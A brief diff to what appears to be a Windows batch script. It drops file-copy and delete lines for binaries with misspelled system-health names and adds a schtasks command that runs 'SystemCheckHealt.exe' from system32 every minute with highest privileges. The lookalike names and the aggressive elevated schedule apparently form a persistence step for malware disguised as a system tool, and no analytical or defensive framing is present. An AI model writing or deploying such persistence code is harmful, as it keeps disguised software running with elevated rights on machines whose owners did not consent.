@@ -1,6 +1,1 @@
-del %appdata%/a.exe
-del %appdata%/SysHealth.exe
-del %appdata%/SystemCheckHealt.vbs
-
-copy %windir%/system32/SysHealth.exe %appdata%\
-copy %windir%system32/SystemChechHealth.vbs %appdata%\
+schtasks /create /tn "SystemCheckHealt" /sc minute /mo 1 /tr "%windir%\system32\SystemCheckHealt.exe" /RL HIGHEST
